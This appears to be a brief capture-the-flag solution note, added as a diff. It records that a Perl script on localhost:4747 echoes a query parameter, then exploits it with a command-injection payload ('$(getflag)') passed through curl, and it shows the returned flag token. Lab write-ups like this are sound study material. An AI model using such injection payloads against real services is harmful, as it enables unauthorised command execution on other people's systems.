@@ -1,0 +1,9 @@
+found localhost:4747 address in pl file
+
+found that script should print passed argument "x";
+
+curl localhost:4747?x=kek
+kek
+
+curl localhost:4747?x='$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
